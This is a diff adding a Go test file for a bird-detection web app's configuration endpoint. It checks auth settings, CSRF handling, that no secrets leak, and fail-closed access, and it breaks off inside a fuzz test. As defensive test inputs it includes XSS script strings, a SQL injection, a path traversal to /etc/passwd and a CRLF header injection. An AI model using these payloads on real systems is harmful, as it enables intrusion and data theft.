@@ -1,0 +1,1218 @@
+// app_test.go: Package api provides tests for the app config endpoint.
+// This file tests /api/v2/app/config which returns security configuration,
+// CSRF tokens, and version information to the frontend SPA.
+
+package api
+
+import (
+	"encoding/json"
+	"io"
+	"log"
+	"net/http"
+	"net/http/httptest"
+	"strings"
+	"sync"
+	"testing"
+	"time"
+	"unicode/utf8"
+
+	"github.com/gorilla/sessions"
+	"github.com/labstack/echo/v4"
+	"github.com/markbates/goth/gothic"
+	"github.com/stretchr/testify/assert"
+	"github.com/stretchr/testify/mock"
+	"github.com/stretchr/testify/require"
+	"github.com/tphakala/birdnet-go/internal/api/auth"
+	"github.com/tphakala/birdnet-go/internal/conf"
+	"github.com/tphakala/birdnet-go/internal/datastore/mocks"
+	"github.com/tphakala/birdnet-go/internal/imageprovider"
+	"github.com/tphakala/birdnet-go/internal/observability"
+	"github.com/tphakala/birdnet-go/internal/security"
+	"github.com/tphakala/birdnet-go/internal/suncalc"
+)
+
+// =============================================================================
+// Test Setup Helpers
+// =============================================================================
+
+// setupAppConfigTest creates a test environment for app config tests.
+func setupAppConfigTest(t *testing.T, securityConfig conf.Security) (*echo.Echo, *Controller) {
+	t.Helper()
+
+	e := echo.New()
+	mockDS := mocks.NewMockInterface(t)
+
+	settings := &conf.Settings{
+		Version: "1.0.0-test",
+		WebServer: conf.WebServerSettings{
+			Debug: true,
+		},
+		Realtime: conf.RealtimeSettings{
+			Audio: conf.AudioSettings{
+				Export: conf.ExportSettings{
+					Path: t.TempDir(),
+				},
+			},
+		},
+		Security: securityConfig,
+	}
+
+	logger := log.New(io.Discard, "APP TEST: ", log.LstdFlags)
+
+	mockImageProvider := &MockImageProvider{}
+	mockImageProvider.On("Fetch", mock.Anything).Return(imageprovider.BirdImage{}, nil).Maybe()
+
+	birdImageCache := &imageprovider.BirdImageCache{}
+	birdImageCache.SetImageProvider(mockImageProvider)
+
+	sunCalc := suncalc.NewSunCalc(testHelsinkiLatitude, testHelsinkiLongitude)
+	controlChan := make(chan string, testControlChannelBuf)
+	mockMetrics, _ := observability.NewMetrics()
+
+	controller, err := NewWithOptions(e, mockDS, settings, birdImageCache, sunCalc, controlChan, logger, mockMetrics, false)
+	require.NoError(t, err, "Failed to create test API controller")
+
+	t.Cleanup(func() {
+		controller.Shutdown()
+		close(controlChan)
+	})
+
+	return e, controller
+}
+
+// setupAppConfigTestWithAuth creates a test environment with full auth support.
+func setupAppConfigTestWithAuth(t *testing.T, securityConfig conf.Security) (*echo.Echo, *Controller) {
+	t.Helper()
+
+	e := echo.New()
+	mockDS := mocks.NewMockInterface(t)
+
+	settings := &conf.Settings{
+		Version: "1.0.0-test",
+		WebServer: conf.WebServerSettings{
+			Debug: true,
+		},
+		Realtime: conf.RealtimeSettings{
+			Audio: conf.AudioSettings{
+				Export: conf.ExportSettings{
+					Path: t.TempDir(),
+				},
+			},
+		},
+		Security: securityConfig,
+	}
+
+	logger := log.New(io.Discard, "APP TEST: ", log.LstdFlags)
+
+	mockImageProvider := &MockImageProvider{}
+	mockImageProvider.On("Fetch", mock.Anything).Return(imageprovider.BirdImage{}, nil).Maybe()
+
+	birdImageCache := &imageprovider.BirdImageCache{}
+	birdImageCache.SetImageProvider(mockImageProvider)
+
+	sunCalc := suncalc.NewSunCalc(testHelsinkiLatitude, testHelsinkiLongitude)
+	controlChan := make(chan string, testControlChannelBuf)
+	mockMetrics, _ := observability.NewMetrics()
+
+	// Create OAuth2Server for auth
+	oauth2Server := security.NewOAuth2ServerForTesting(settings)
+	authService := auth.NewSecurityAdapter(oauth2Server, nil)
+	authMw := auth.NewMiddleware(authService, nil)
+
+	// Initialize gothic session store
+	gothic.Store = sessions.NewCookieStore([]byte(settings.Security.SessionSecret))
+
+	controller, err := NewWithOptions(e, mockDS, settings, birdImageCache, sunCalc, controlChan, logger, mockMetrics, true,
+		WithAuthMiddleware(authMw.Authenticate), WithAuthService(authService))
+	require.NoError(t, err, "Failed to create test API controller with auth")
+
+	t.Cleanup(func() {
+		controller.Shutdown()
+		close(controlChan)
+	})
+
+	return e, controller
+}
+
+// =============================================================================
+// Integration Tests
+// =============================================================================
+
+// TestGetAppConfig_NoSecurity tests the endpoint when no security is configured.
+func TestGetAppConfig_NoSecurity(t *testing.T) {
+	e, controller := setupAppConfigTest(t, conf.Security{})
+
+	req := httptest.NewRequest(http.MethodGet, "/api/v2/app/config", http.NoBody)
+	rec := httptest.NewRecorder()
+	c := e.NewContext(req, rec)
+	c.SetPath("/api/v2/app/config")
+
+	err := controller.GetAppConfig(c)
+	require.NoError(t, err)
+	assert.Equal(t, http.StatusOK, rec.Code)
+
+	var response AppConfigResponse
+	err = json.Unmarshal(rec.Body.Bytes(), &response)
+	require.NoError(t, err)
+
+	// When no security is configured, accessAllowed should be true
+	assert.False(t, response.Security.Enabled, "Security should be disabled")
+	assert.True(t, response.Security.AccessAllowed, "Access should be allowed when security is disabled")
+	assert.Equal(t, "1.0.0-test", response.Version)
+
+	// All auth methods should be disabled
+	assert.False(t, response.Security.AuthConfig.BasicEnabled)
+	assert.False(t, response.Security.AuthConfig.GoogleEnabled)
+	assert.False(t, response.Security.AuthConfig.GithubEnabled)
+	assert.False(t, response.Security.AuthConfig.MicrosoftEnabled)
+}
+
+// TestGetAppConfig_BasicAuthEnabled tests the endpoint with BasicAuth enabled.
+func TestGetAppConfig_BasicAuthEnabled(t *testing.T) {
+	securityConfig := conf.Security{
+		SessionSecret: "test-session-secret-32-chars-long",
+		BasicAuth: conf.BasicAuth{
+			Enabled:        true,
+			Password:       "testpassword",
+			ClientID:       "test-client",
+			AuthCodeExp:    5 * time.Minute,
+			AccessTokenExp: 24 * time.Hour,
+		},
+	}
+
+	e, controller := setupAppConfigTestWithAuth(t, securityConfig)
+
+	req := httptest.NewRequest(http.MethodGet, "/api/v2/app/config", http.NoBody)
+	rec := httptest.NewRecorder()
+	c := e.NewContext(req, rec)
+	c.SetPath("/api/v2/app/config")
+
+	err := controller.GetAppConfig(c)
+	require.NoError(t, err)
+	assert.Equal(t, http.StatusOK, rec.Code)
+
+	var response AppConfigResponse
+	err = json.Unmarshal(rec.Body.Bytes(), &response)
+	require.NoError(t, err)
+
+	assert.True(t, response.Security.Enabled, "Security should be enabled")
+	assert.True(t, response.Security.AuthConfig.BasicEnabled, "BasicAuth should be enabled")
+	assert.False(t, response.Security.AuthConfig.GoogleEnabled)
+	assert.False(t, response.Security.AuthConfig.GithubEnabled)
+	assert.False(t, response.Security.AuthConfig.MicrosoftEnabled)
+}
+
+// TestGetAppConfig_AllAuthMethods tests with all auth methods enabled.
+func TestGetAppConfig_AllAuthMethods(t *testing.T) {
+	securityConfig := conf.Security{
+		SessionSecret: "test-session-secret-32-chars-long",
+		BasicAuth: conf.BasicAuth{
+			Enabled:        true,
+			Password:       "testpassword",
+			ClientID:       "test-client",
+			AuthCodeExp:    5 * time.Minute,
+			AccessTokenExp: 24 * time.Hour,
+		},
+		GoogleAuth: conf.SocialProvider{
+			Enabled:      true,
+			ClientID:     "google-client-id",
+			ClientSecret: "google-secret",
+		},
+		GithubAuth: conf.SocialProvider{
+			Enabled:      true,
+			ClientID:     "github-client-id",
+			ClientSecret: "github-secret",
+		},
+		MicrosoftAuth: conf.SocialProvider{
+			Enabled:      true,
+			ClientID:     "microsoft-client-id",
+			ClientSecret: "microsoft-secret",
+		},
+	}
+
+	e, controller := setupAppConfigTestWithAuth(t, securityConfig)
+
+	req := httptest.NewRequest(http.MethodGet, "/api/v2/app/config", http.NoBody)
+	rec := httptest.NewRecorder()
+	c := e.NewContext(req, rec)
+	c.SetPath("/api/v2/app/config")
+
+	err := controller.GetAppConfig(c)
+	require.NoError(t, err)
+	assert.Equal(t, http.StatusOK, rec.Code)
+
+	var response AppConfigResponse
+	err = json.Unmarshal(rec.Body.Bytes(), &response)
+	require.NoError(t, err)
+
+	assert.True(t, response.Security.Enabled)
+	assert.True(t, response.Security.AuthConfig.BasicEnabled)
+	assert.True(t, response.Security.AuthConfig.GoogleEnabled)
+	assert.True(t, response.Security.AuthConfig.GithubEnabled)
+	assert.True(t, response.Security.AuthConfig.MicrosoftEnabled)
+}
+
+// TestGetAppConfig_CSRFTokenFromContext tests CSRF token extraction from context.
+func TestGetAppConfig_CSRFTokenFromContext(t *testing.T) {
+	e, controller := setupAppConfigTest(t, conf.Security{})
+
+	req := httptest.NewRequest(http.MethodGet, "/api/v2/app/config", http.NoBody)
+	rec := httptest.NewRecorder()
+	c := e.NewContext(req, rec)
+	c.SetPath("/api/v2/app/config")
+
+	// Simulate CSRF middleware setting the token
+	expectedToken := "test-csrf-token-abc123"
+	c.Set("csrf", expectedToken)
+
+	err := controller.GetAppConfig(c)
+	require.NoError(t, err)
+	assert.Equal(t, http.StatusOK, rec.Code)
+
+	var response AppConfigResponse
+	err = json.Unmarshal(rec.Body.Bytes(), &response)
+	require.NoError(t, err)
+
+	assert.Equal(t, expectedToken, response.CSRFToken, "CSRF token should match context value")
+}
+
+// TestGetAppConfig_NoCSRFToken tests behavior when CSRF token is not in context.
+func TestGetAppConfig_NoCSRFToken(t *testing.T) {
+	e, controller := setupAppConfigTest(t, conf.Security{})
+
+	req := httptest.NewRequest(http.MethodGet, "/api/v2/app/config", http.NoBody)
+	rec := httptest.NewRecorder()
+	c := e.NewContext(req, rec)
+	c.SetPath("/api/v2/app/config")
+	// Don't set csrf in context
+
+	err := controller.GetAppConfig(c)
+	require.NoError(t, err)
+	assert.Equal(t, http.StatusOK, rec.Code)
+
+	var response AppConfigResponse
+	err = json.Unmarshal(rec.Body.Bytes(), &response)
+	require.NoError(t, err)
+
+	assert.Empty(t, response.CSRFToken, "CSRF token should be empty when not in context")
+}
+
+// TestGetAppConfig_ResponseFormat validates the JSON response structure.
+func TestGetAppConfig_ResponseFormat(t *testing.T) {
+	e, controller := setupAppConfigTest(t, conf.Security{})
+
+	req := httptest.NewRequest(http.MethodGet, "/api/v2/app/config", http.NoBody)
+	rec := httptest.NewRecorder()
+	c := e.NewContext(req, rec)
+	c.SetPath("/api/v2/app/config")
+
+	err := controller.GetAppConfig(c)
+	require.NoError(t, err)
+
+	// Verify content type
+	contentType := rec.Header().Get("Content-Type")
+	assert.Contains(t, contentType, "application/json", "Response should be JSON")
+
+	// Verify JSON structure using generic map
+	var rawResponse map[string]any
+	err = json.Unmarshal(rec.Body.Bytes(), &rawResponse)
+	require.NoError(t, err, "Response should be valid JSON")
+
+	// Check required top-level fields exist
+	assert.Contains(t, rawResponse, "csrfToken", "Response should have csrfToken field")
+	assert.Contains(t, rawResponse, "security", "Response should have security field")
+	assert.Contains(t, rawResponse, "version", "Response should have version field")
+
+	// Check security sub-structure
+	security, ok := rawResponse["security"].(map[string]any)
+	require.True(t, ok, "security should be an object")
+	assert.Contains(t, security, "enabled", "security should have enabled field")
+	assert.Contains(t, security, "accessAllowed", "security should have accessAllowed field")
+	assert.Contains(t, security, "authConfig", "security should have authConfig field")
+
+	// Check authConfig sub-structure
+	authConfig, ok := security["authConfig"].(map[string]any)
+	require.True(t, ok, "authConfig should be an object")
+	assert.Contains(t, authConfig, "basicEnabled", "authConfig should have basicEnabled field")
+	assert.Contains(t, authConfig, "googleEnabled", "authConfig should have googleEnabled field")
+	assert.Contains(t, authConfig, "githubEnabled", "authConfig should have githubEnabled field")
+	assert.Contains(t, authConfig, "microsoftEnabled", "authConfig should have microsoftEnabled field")
+}
+
+// TestGetAppConfig_ContentTypeHeader verifies correct content-type header.
+func TestGetAppConfig_ContentTypeHeader(t *testing.T) {
+	e, controller := setupAppConfigTest(t, conf.Security{})
+
+	req := httptest.NewRequest(http.MethodGet, "/api/v2/app/config", http.NoBody)
+	rec := httptest.NewRecorder()
+	c := e.NewContext(req, rec)
+	c.SetPath("/api/v2/app/config")
+
+	err := controller.GetAppConfig(c)
+	require.NoError(t, err)
+
+	contentType := rec.Header().Get("Content-Type")
+	assert.Contains(t, contentType, "application/json", "Content-Type should be JSON")
+}
+
+// =============================================================================
+// Security Tests
+// =============================================================================
+
+// TestGetAppConfig_NoSensitiveDataExposed ensures passwords/secrets are not leaked.
+func TestGetAppConfig_NoSensitiveDataExposed(t *testing.T) {
+	securityConfig := conf.Security{
+		SessionSecret: "super-secret-session-key-do-not-leak",
+		BasicAuth: conf.BasicAuth{
+			Enabled:        true,
+			Password:       "super-secret-password-do-not-leak",
+			ClientID:       "test-client",
+			AuthCodeExp:    5 * time.Minute,
+			AccessTokenExp: 24 * time.Hour,
+		},
+		GoogleAuth: conf.SocialProvider{
+			Enabled:      true,
+			ClientID:     "google-client-id",
+			ClientSecret: "google-super-secret-do-not-leak",
+		},
+	}
+
+	e, controller := setupAppConfigTestWithAuth(t, securityConfig)
+
+	req := httptest.NewRequest(http.MethodGet, "/api/v2/app/config", http.NoBody)
+	rec := httptest.NewRecorder()
+	c := e.NewContext(req, rec)
+	c.SetPath("/api/v2/app/config")
+
+	err := controller.GetAppConfig(c)
+	require.NoError(t, err)
+
+	body := rec.Body.String()
+
+	// Ensure no secrets are exposed
+	assert.NotContains(t, body, "super-secret-session-key-do-not-leak", "Session secret should not be exposed")
+	assert.NotContains(t, body, "super-secret-password-do-not-leak", "Password should not be exposed")
+	assert.NotContains(t, body, "google-super-secret-do-not-leak", "OAuth secrets should not be exposed")
+	assert.NotContains(t, body, "google-client-id", "OAuth client IDs should not be exposed")
+	assert.NotContains(t, body, "ClientSecret", "ClientSecret field should not exist")
+	assert.NotContains(t, body, "Password", "Password field should not exist")
+}
+
+// TestGetAppConfig_InvalidCSRFTokenType tests behavior with non-string CSRF token.
+func TestGetAppConfig_InvalidCSRFTokenType(t *testing.T) {
+	e, controller := setupAppConfigTest(t, conf.Security{})
+
+	req := httptest.NewRequest(http.MethodGet, "/api/v2/app/config", http.NoBody)
+	rec := httptest.NewRecorder()
+	c := e.NewContext(req, rec)
+	c.SetPath("/api/v2/app/config")
+
+	// Set invalid type for csrf - should not panic
+	c.Set("csrf", 12345) // int instead of string
+
+	err := controller.GetAppConfig(c)
+	require.NoError(t, err, "Should not error with invalid CSRF token type")
+	assert.Equal(t, http.StatusOK, rec.Code)
+
+	var response AppConfigResponse
+	err = json.Unmarshal(rec.Body.Bytes(), &response)
+	require.NoError(t, err)
+
+	// Should fall back to empty string
+	assert.Empty(t, response.CSRFToken, "Invalid CSRF type should result in empty token")
+}
+
+// TestGetAppConfig_NilAuthService tests behavior when auth service is nil.
+func TestGetAppConfig_NilAuthService(t *testing.T) {
+	// Create controller without auth service
+	securityConfig := conf.Security{
+		BasicAuth: conf.BasicAuth{
+			Enabled:  true,
+			Password: "test",
+		},
+	}
+
+	e, controller := setupAppConfigTest(t, securityConfig)
+	// Note: setupAppConfigTest doesn't set authService, so it's nil
+
+	req := httptest.NewRequest(http.MethodGet, "/api/v2/app/config", http.NoBody)
+	rec := httptest.NewRecorder()
+	c := e.NewContext(req, rec)
+	c.SetPath("/api/v2/app/config")
+
+	err := controller.GetAppConfig(c)
+	require.NoError(t, err, "Should handle nil auth service gracefully")
+	assert.Equal(t, http.StatusOK, rec.Code)
+
+	var response AppConfigResponse
+	err = json.Unmarshal(rec.Body.Bytes(), &response)
+	require.NoError(t, err)
+
+	// With nil auth service, should fail closed (deny access)
+	assert.True(t, response.Security.Enabled)
+	assert.False(t, response.Security.AccessAllowed, "Should deny access when auth service is nil")
+}
+
+// =============================================================================
+// Concurrency Tests
+// =============================================================================
+
+// TestGetAppConfig_Concurrent tests concurrent access to the endpoint.
+func TestGetAppConfig_Concurrent(t *testing.T) {
+	e, controller := setupAppConfigTest(t, conf.Security{})
+
+	const numRequests = 100
+	var wg sync.WaitGroup
+	errors := make(chan error, numRequests)
+
+	for range numRequests {
+		wg.Go(func() {
+			req := httptest.NewRequest(http.MethodGet, "/api/v2/app/config", http.NoBody)
+			rec := httptest.NewRecorder()
+			c := e.NewContext(req, rec)
+			c.SetPath("/api/v2/app/config")
+
+			if err := controller.GetAppConfig(c); err != nil {
+				errors <- err
+				return
+			}
+
+			if rec.Code != http.StatusOK {
+				errors <- echo.NewHTTPError(rec.Code, "unexpected status")
+			}
+		})
+	}
+
+	wg.Wait()
+	close(errors)
+
+	for err := range errors {
+		t.Errorf("Concurrent request failed: %v", err)
+	}
+}
+
+// =============================================================================
+// Edge Case Tests
+// =============================================================================
+
+// TestGetAppConfig_EmptyVersion tests with empty version string.
+func TestGetAppConfig_EmptyVersion(t *testing.T) {
+	e := echo.New()
+	mockDS := mocks.NewMockInterface(t)
+
+	settings := &conf.Settings{
+		Version: "", // Empty version
+		Realtime: conf.RealtimeSettings{
+			Audio: conf.AudioSettings{
+				Export: conf.ExportSettings{
+					Path: t.TempDir(),
+				},
+			},
+		},
+	}
+
+	logger := log.New(io.Discard, "APP TEST: ", log.LstdFlags)
+	mockImageProvider := &MockImageProvider{}
+	mockImageProvider.On("Fetch", mock.Anything).Return(imageprovider.BirdImage{}, nil).Maybe()
+	birdImageCache := &imageprovider.BirdImageCache{}
+	birdImageCache.SetImageProvider(mockImageProvider)
+	sunCalc := suncalc.NewSunCalc(testHelsinkiLatitude, testHelsinkiLongitude)
+	controlChan := make(chan string, testControlChannelBuf)
+	mockMetrics, _ := observability.NewMetrics()
+
+	controller, err := NewWithOptions(e, mockDS, settings, birdImageCache, sunCalc, controlChan, logger, mockMetrics, false)
+	require.NoError(t, err)
+
+	t.Cleanup(func() {
+		controller.Shutdown()
+		close(controlChan)
+	})
+
+	req := httptest.NewRequest(http.MethodGet, "/api/v2/app/config", http.NoBody)
+	rec := httptest.NewRecorder()
+	c := e.NewContext(req, rec)
+	c.SetPath("/api/v2/app/config")
+
+	err = controller.GetAppConfig(c)
+	require.NoError(t, err)
+	assert.Equal(t, http.StatusOK, rec.Code)
+
+	var response AppConfigResponse
+	err = json.Unmarshal(rec.Body.Bytes(), &response)
+	require.NoError(t, err)
+
+	assert.Empty(t, response.Version, "Empty version should be returned as-is")
+}
+
+// TestGetAppConfig_VersionWithSpecialChars tests version string with special characters.
+func TestGetAppConfig_VersionWithSpecialChars(t *testing.T) {
+	testVersions := []string{
+		"1.0.0-beta+build.123",
+		"v2.3.4-rc.1",
+		"0.0.1-SNAPSHOT",
+		"1.0.0-alpha.1+001",
+		"Development Build (local)",
+		"1.0.0 <script>alert('xss')</script>", // XSS attempt - should be JSON encoded
+	}
+
+	for _, version := range testVersions {
+		t.Run(version, func(t *testing.T) {
+			e := echo.New()
+			mockDS := mocks.NewMockInterface(t)
+
+			settings := &conf.Settings{
+				Version: version,
+				Realtime: conf.RealtimeSettings{
+					Audio: conf.AudioSettings{
+						Export: conf.ExportSettings{
+							Path: t.TempDir(),
+						},
+					},
+				},
+			}
+
+			logger := log.New(io.Discard, "APP TEST: ", log.LstdFlags)
+			mockImageProvider := &MockImageProvider{}
+			mockImageProvider.On("Fetch", mock.Anything).Return(imageprovider.BirdImage{}, nil).Maybe()
+			birdImageCache := &imageprovider.BirdImageCache{}
+			birdImageCache.SetImageProvider(mockImageProvider)
+			sunCalc := suncalc.NewSunCalc(testHelsinkiLatitude, testHelsinkiLongitude)
+			controlChan := make(chan string, testControlChannelBuf)
+			mockMetrics, _ := observability.NewMetrics()
+
+			controller, err := NewWithOptions(e, mockDS, settings, birdImageCache, sunCalc, controlChan, logger, mockMetrics, false)
+			require.NoError(t, err)
+
+			t.Cleanup(func() {
+				controller.Shutdown()
+				close(controlChan)
+			})
+
+			req := httptest.NewRequest(http.MethodGet, "/api/v2/app/config", http.NoBody)
+			rec := httptest.NewRecorder()
+			c := e.NewContext(req, rec)
+			c.SetPath("/api/v2/app/config")
+
+			err = controller.GetAppConfig(c)
+			require.NoError(t, err)
+			assert.Equal(t, http.StatusOK, rec.Code)
+
+			var response AppConfigResponse
+			err = json.Unmarshal(rec.Body.Bytes(), &response)
+			require.NoError(t, err, "Response should be valid JSON regardless of version content")
+
+			// Version should match exactly (JSON encoding handles any special chars)
+			assert.Equal(t, version, response.Version)
+		})
+	}
+}
+
+// TestGetAppConfig_HTTPMethods tests that only GET is supported.
+func TestGetAppConfig_HTTPMethods(t *testing.T) {
+	e, controller := setupAppConfigTest(t, conf.Security{})
+
+	// Only test that GET works - other methods would be rejected by router
+	req := httptest.NewRequest(http.MethodGet, "/api/v2/app/config", http.NoBody)
+	rec := httptest.NewRecorder()
+	c := e.NewContext(req, rec)
+	c.SetPath("/api/v2/app/config")
+
+	err := controller.GetAppConfig(c)
+	require.NoError(t, err)
+	assert.Equal(t, http.StatusOK, rec.Code)
+}
+
+// =============================================================================
+// determineAccessAllowed Tests
+// =============================================================================
+
+// TestDetermineAccessAllowed_SecurityDisabled tests access when security is off.
+func TestDetermineAccessAllowed_SecurityDisabled(t *testing.T) {
+	e, controller := setupAppConfigTest(t, conf.Security{})
+
+	req := httptest.NewRequest(http.MethodGet, "/api/v2/app/config", http.NoBody)
+	rec := httptest.NewRecorder()
+	c := e.NewContext(req, rec)
+
+	allowed := controller.determineAccessAllowed(c, false)
+	assert.True(t, allowed, "Should allow access when security is disabled")
+}
+
+// TestDetermineAccessAllowed_SecurityEnabledNoAuthService tests fail-closed behavior.
+func TestDetermineAccessAllowed_SecurityEnabledNoAuthService(t *testing.T) {
+	e, controller := setupAppConfigTest(t, conf.Security{
+		BasicAuth: conf.BasicAuth{
+			Enabled:  true,
+			Password: "test",
+		},
+	})
+
+	req := httptest.NewRequest(http.MethodGet, "/api/v2/app/config", http.NoBody)
+	rec := httptest.NewRecorder()
+	c := e.NewContext(req, rec)
+
+	allowed := controller.determineAccessAllowed(c, true)
+	assert.False(t, allowed, "Should deny access when auth service is nil (fail closed)")
+}
+
+// =============================================================================
+// Malformed Request Tests
+// =============================================================================
+
+// TestGetAppConfig_MalformedHeaders tests handling of malformed request headers.
+func TestGetAppConfig_MalformedHeaders(t *testing.T) {
+	e, controller := setupAppConfigTest(t, conf.Security{})
+
+	testCases := []struct {
+		name        string
+		headerName  string
+		headerValue string
+	}{
+		{"Empty Accept", "Accept", ""},
+		{"Invalid Accept", "Accept", "invalid/type"},
+		{"Null in header", "X-Custom", "value\x00with\x00nulls"},
+		{"Very long header", "X-Custom", string(make([]byte, 10000))},
+		{"Unicode header", "X-Custom", "日本語テスト"},
+		{"Control chars", "X-Custom", "\x01\x02\x03"},
+		{"CRLF attempt", "X-Custom", "value\r\nX-Injected: evil"},
+	}
+
+	for _, tc := range testCases {
+		t.Run(tc.name, func(t *testing.T) {
+			req := httptest.NewRequest(http.MethodGet, "/api/v2/app/config", http.NoBody)
+			req.Header.Set(tc.headerName, tc.headerValue)
+			rec := httptest.NewRecorder()
+			c := e.NewContext(req, rec)
+			c.SetPath("/api/v2/app/config")
+
+			// Should not panic and should return valid response
+			err := controller.GetAppConfig(c)
+			require.NoError(t, err, "Should handle malformed header: %s", tc.name)
+			assert.Equal(t, http.StatusOK, rec.Code)
+
+			var response AppConfigResponse
+			err = json.Unmarshal(rec.Body.Bytes(), &response)
+			require.NoError(t, err, "Response should be valid JSON")
+		})
+	}
+}
+
+// TestGetAppConfig_MalformedQueryParams tests handling of query parameters.
+func TestGetAppConfig_MalformedQueryParams(t *testing.T) {
+	e, controller := setupAppConfigTest(t, conf.Security{})
+
+	testCases := []struct {
+		name  string
+		query string // Just the query string, we'll build the URL safely
+	}{
+		{"No query", ""},
+		{"Empty query", "?"},
+		{"Random param", "?foo=bar"},
+		{"SQL injection attempt", "?id=1%3BDROP%20TABLE%20users"}, // URL-encoded semicolon
+		{"XSS attempt", "?param=%3Cscript%3Ealert(1)%3C%2Fscript%3E"},
+		{"Path traversal", "?file=..%2F..%2F..%2Fetc%2Fpasswd"},
+		{"Unicode query", "?name=%E6%97%A5%E6%9C%AC%E8%AA%9E"},
+	}
+
+	for _, tc := range testCases {
+		t.Run(tc.name, func(t *testing.T) {
+			url := "/api/v2/app/config" + tc.query
+			req := httptest.NewRequest(http.MethodGet, url, http.NoBody)
+			rec := httptest.NewRecorder()
+			c := e.NewContext(req, rec)
+			c.SetPath("/api/v2/app/config")
+
+			// Should not panic and should return valid response
+			// Query params are ignored by this endpoint
+			err := controller.GetAppConfig(c)
+			require.NoError(t, err, "Should handle malformed query: %s", tc.name)
+			assert.Equal(t, http.StatusOK, rec.Code)
+
+			var response AppConfigResponse
+			err = json.Unmarshal(rec.Body.Bytes(), &response)
+			require.NoError(t, err, "Response should be valid JSON")
+		})
+	}
+}
+
+// TestGetAppConfig_MalformedContextValues tests handling of malformed context values.
+func TestGetAppConfig_MalformedContextValues(t *testing.T) {
+	e, controller := setupAppConfigTest(t, conf.Security{})
+
+	testCases := []struct {
+		name  string
+		key   string
+		value any
+	}{
+		{"Nil csrf", "csrf", nil},
+		{"Int csrf", "csrf", 12345},
+		{"Float csrf", "csrf", 3.14159},
+		{"Bool csrf", "csrf", true},
+		{"Slice csrf", "csrf", []string{"a", "b"}},
+		{"Map csrf", "csrf", map[string]string{"key": "value"}},
+		{"Struct csrf", "csrf", struct{ X int }{42}},
+		{"Empty string csrf", "csrf", ""},
+		{"Whitespace csrf", "csrf", "   \t\n   "},
+		{"Very long csrf", "csrf", string(make([]byte, 100000))},
+		{"Null byte csrf", "csrf", "token\x00with\x00nulls"},
+		{"Unicode csrf", "csrf", "日本語トークン"},
+	}
+
+	for _, tc := range testCases {
+		t.Run(tc.name, func(t *testing.T) {
+			req := httptest.NewRequest(http.MethodGet, "/api/v2/app/config", http.NoBody)
+			rec := httptest.NewRecorder()
+			c := e.NewContext(req, rec)
+			c.SetPath("/api/v2/app/config")
+			c.Set(tc.key, tc.value)
+
+			// Should not panic
+			err := controller.GetAppConfig(c)
+			require.NoError(t, err, "Should handle malformed context value: %s", tc.name)
+			assert.Equal(t, http.StatusOK, rec.Code)
+
+			var response AppConfigResponse
+			err = json.Unmarshal(rec.Body.Bytes(), &response)
+			require.NoError(t, err, "Response should be valid JSON")
+		})
+	}
+}
+
+// TestGetAppConfig_ResponseConsistency tests that responses are consistent.
+func TestGetAppConfig_ResponseConsistency(t *testing.T) {
+	e, controller := setupAppConfigTest(t, conf.Security{})
+
+	const iterations = 10
+	responses := make([]AppConfigResponse, 0, iterations)
+
+	for range iterations {
+		req := httptest.NewRequest(http.MethodGet, "/api/v2/app/config", http.NoBody)
+		rec := httptest.NewRecorder()
+		c := e.NewContext(req, rec)
+		c.SetPath("/api/v2/app/config")
+		c.Set("csrf", "consistent-token")
+
+		err := controller.GetAppConfig(c)
+		require.NoError(t, err)
+		assert.Equal(t, http.StatusOK, rec.Code)
+
+		var response AppConfigResponse
+		err = json.Unmarshal(rec.Body.Bytes(), &response)
+		require.NoError(t, err)
+
+		responses = append(responses, response)
+	}
+
+	// All responses should be identical
+	for i := 1; i < len(responses); i++ {
+		assert.Equal(t, responses[0], responses[i], "Response %d should match response 0", i)
+	}
+}
+
+// TestGetAppConfig_ResponseTiming tests that response time is reasonable.
+func TestGetAppConfig_ResponseTiming(t *testing.T) {
+	e, controller := setupAppConfigTest(t, conf.Security{})
+
+	req := httptest.NewRequest(http.MethodGet, "/api/v2/app/config", http.NoBody)
+	rec := httptest.NewRecorder()
+	c := e.NewContext(req, rec)
+	c.SetPath("/api/v2/app/config")
+
+	start := time.Now()
+	err := controller.GetAppConfig(c)
+	duration := time.Since(start)
+
+	require.NoError(t, err)
+	assert.Equal(t, http.StatusOK, rec.Code)
+
+	// Config endpoint should respond very quickly (under 50ms)
+	assert.Less(t, duration.Milliseconds(), int64(50),
+		"Response should be fast, got %v", duration)
+}
+
+// TestGetAppConfig_NoExtraFields tests that no unexpected fields are returned.
+func TestGetAppConfig_NoExtraFields(t *testing.T) {
+	e, controller := setupAppConfigTest(t, conf.Security{})
+
+	req := httptest.NewRequest(http.MethodGet, "/api/v2/app/config", http.NoBody)
+	rec := httptest.NewRecorder()
+	c := e.NewContext(req, rec)
+	c.SetPath("/api/v2/app/config")
+
+	err := controller.GetAppConfig(c)
+	require.NoError(t, err)
+
+	var rawResponse map[string]any
+	err = json.Unmarshal(rec.Body.Bytes(), &rawResponse)
+	require.NoError(t, err)
+
+	// Only these top-level keys should exist
+	expectedKeys := map[string]bool{
+		"csrfToken": true,
+		"security":  true,
+		"version":   true,
+	}
+
+	for key := range rawResponse {
+		assert.True(t, expectedKeys[key], "Unexpected field in response: %s", key)
+	}
+
+	// Check security sub-object
+	security := rawResponse["security"].(map[string]any)
+	expectedSecurityKeys := map[string]bool{
+		"enabled":       true,
+		"accessAllowed": true,
+		"authConfig":    true,
+	}
+
+	for key := range security {
+		assert.True(t, expectedSecurityKeys[key], "Unexpected field in security: %s", key)
+	}
+
+	// Check authConfig sub-object
+	authConfig := security["authConfig"].(map[string]any)
+	expectedAuthKeys := map[string]bool{
+		"basicEnabled":     true,
+		"googleEnabled":    true,
+		"githubEnabled":    true,
+		"microsoftEnabled": true,
+	}
+
+	for key := range authConfig {
+		assert.True(t, expectedAuthKeys[key], "Unexpected field in authConfig: %s", key)
+	}
+}
+
+// =============================================================================
+// FUZZ TESTS
+// =============================================================================
+
+// FuzzGetAppConfig_Headers fuzzes the endpoint with various header values.
+// Run with: go test -fuzz=FuzzGetAppConfig_Headers -fuzztime=30s
+func FuzzGetAppConfig_Headers(f *testing.F) {
+	// Add seed corpus
+	f.Add("application/json", "test-value", "normal-token")
+	f.Add("", "", "")
+	f.Add("text/html", "x-custom-header-value", "csrf-token-123")
+	f.Add("*/*", string(make([]byte, 1000)), "token\x00with\x00nulls")
+	f.Add("invalid/type", "日本語", "unicode-token")
+	f.Add("application/json; charset=utf-8", "\r\nX-Injected: evil", "<script>alert(1)</script>")
+
+	f.Fuzz(func(t *testing.T, accept, customHeader, csrfToken string) {
+		e := echo.New()
+		mockDS := mocks.NewMockInterface(t)
+		settings := &conf.Settings{
